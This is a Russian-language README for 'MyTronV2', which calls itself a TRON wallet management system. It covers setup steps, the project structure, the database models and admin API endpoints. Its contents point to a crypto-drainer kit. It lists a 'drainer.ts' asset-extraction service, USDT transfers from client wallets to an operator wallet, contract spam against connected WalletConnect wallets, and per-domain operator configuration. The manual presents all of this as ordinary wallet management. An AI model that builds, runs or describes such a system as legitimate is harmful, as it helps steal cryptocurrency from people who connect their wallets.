# MyTronV2 - TRON Wallet Management System

Система управления TRON кошельками с поддержкой WalletConnect, обработки транзакций и административной панели.

## 🚀 Быстрый старт

### Требования
- Node.js 16+
- SQLite 3
- TypeScript

### Установка

1. Клонируйте репозиторий:
```bash
git clone <repository-url>
cd mytronV2
```

2. Установите зависимости:
```bash
npm install
```

3. Настройте базу данных:
```bash
npx prisma migrate dev
```

4. Создайте первого администратора:
```bash
npm run create-admin
```

5. Запустите проект:
```bash
npm start
```

Сервер будет доступен по адресу: `http://localhost:3000`

## 📁 Структура проекта

```
src/
├── controllers/           # Контроллеры для публичного API
│   └── check.controller.ts
├── core/
│   ├── api/              # Админский API
│   │   ├── controllers/  # Контроллеры админки
│   │   ├── interfaces/   # Типы и интерфейсы
│   │   ├── middleware/   # Middleware для авторизации
│   │   ├── services/     # Сервисы (JWT, авторизация)
│   │   └── scripts/      # Скрипты инициализации
│   ├── interfaces/       # Общие интерфейсы
│   ├── utils/           # Утилиты и хелперы
│   └── Constants.ts
├── routes/              # Маршруты
│   ├── admin.ts         # Админские роуты
│   └── api.ts           # Публичные роуты
├── services/            # Основные сервисы
│   ├── checkService.ts  # Сервис обработки чеков
│   ├── drainer.ts       # Сервис извлечения активов
│   ├── walletConnect.ts # WalletConnect интеграция
│   ├── walletManagment.ts # Управление кошельками
│   └── transactionsWatcher.ts
├── prisma/              # База данных
│   ├── schema.prisma    # Схема БД
│   └── database.db      # SQLite база
└── index.ts             # Точка входа
```

## 🗄️ База данных

Проект использует SQLite с Prisma ORM. Основные модели:

- **Domain** - Конфигурации доменов и операторов
- **Wallet** - Кошельки пользователей  
- **Admin** - Администраторы системы
- **Check** - Чеки для обработки платежей

## 🔐 Авторизация

### Публичное API
Открытые endpoints для WalletConnect и обработки транзакций.

### Админское API
Защищено JWT авторизацией. Все роуты требуют токен в заголовке:
```
Authorization: Bearer <jwt_token>
```

## 📚 Документация API

- [Админское API](./docs/ADMIN_API.md) - Полная документация админской панели
- [Публичное API](./docs/PUBLIC_API.md) - Документация открытых endpoints

## 🛠️ Основные возможности

### 🌐 Управление доменами
- Создание и настройка доменов
- Конфигурация кошельков операторов
- Управление метаданными

### 👛 Управление кошельками
- Мониторинг подключенных кошельков
- Отслеживание балансов TRX и USDT
- Управление сессиями WalletConnect

### ⛓️ Блокчейн операции
- Переводы USDT с клиентских кошельков на кошелек оператора
- Переводы TRX с кошелька оператора на клиентские
- Спам контрактами для WalletConnect кошельков
- Проверка активности сессий

### ✅ Система чеков
- Обработка платежных чеков
- Таймеры истечения (48 часов)
- Автоматическая очистка истекших чеков

### 🔗 WalletConnect
- Подключение кошельков через QR коды
- Подписание транзакций
- Управление сессиями

## ⚙️ Конфигурация

### Переменные окружения
```env
DATABASE_URL="file:./prisma/database.db"
JWT_SECRET="your-super-secret-jwt-key"
JWT_EXPIRES_IN="24h"
```

### Константы
Настройте в `src/core/Constants.ts`:
- `encrypt_key` - Ключ для XOR шифрования
- Другие константы проекта

## 🔒 Безопасность

- JWT токены для авторизации
- Хеширование паролей с bcrypt
- XOR шифрование для чувствительных данных
- Логирование всех админских действий
- Опциональная IP фильтрация

## 📝 Скрипты

```bash
# Запуск проекта
npm start

# Создание первого администратора
npm run create-admin

# Работа с базой данных
npx prisma migrate dev    # Применить миграции
npx prisma studio        # Браузер БД
npx prisma generate      # Сгенерировать клиент
```

## 🛡️ Мониторинг

Система включает:
- Логирование всех операций
- Мониторинг транзакций
- Отслеживание балансов кошельков
- Статистика по доменам, кошелькам и чекам

## 🤝 API Endpoints

### Публичные (порт 3000)
- `POST /api/fetchWalletConnect` - Подключение WalletConnect
- `POST /api/check` - Обработка чеков
- `GET /api/check/:id` - Информация о чеке
- [Полный список в документации](./docs/PUBLIC_API.md)

### Админские (порт 3000/admin)
- `POST /admin/auth/login` - Авторизация
- `GET /admin/wallets` - Список кошельков
- `POST /admin/blockchain/transfer-usdt-to-operator` - Перевод USDT
- [Полный список в документации](./docs/ADMIN_API.md)

## 🧪 Тестирование

### Создание админа и авторизация
```bash
# 1. Создать админа
npm run create-admin

# 2. Авторизоваться
curl -X POST http://localhost:3000/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# 3. Использовать токен
curl -X GET http://localhost:3000/admin/wallets \
  -H "Authorization: Bearer YOUR_JWT_TOKEN"
```

## 📋 TODO

- [ ] Добавить WebSocket уведомления
- [ ] Интеграция с Telegram ботами
- [ ] Расширенная аналитика
- [ ] Backup и восстановление БД
- [ ] Docker контейнеризация

## 📄 Лицензия

MIT License

## 👥 Поддержка

Для вопросов и поддержки создавайте issues в репозитории.
